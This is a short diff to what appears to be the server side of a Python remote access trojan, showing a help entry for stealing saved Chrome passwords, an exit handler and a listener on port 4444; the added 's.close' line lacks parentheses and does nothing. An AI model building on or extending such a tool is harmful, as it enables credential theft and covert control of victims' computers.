@@ -574,6 +574,7 @@ get_passwords_chrome             get saved passwords in chrome
 
             elif command == 'exit':
                 client.send(command.encode())
+                s.close
                 break
 
 rat = SERVER('127.0.0.1', 4444)
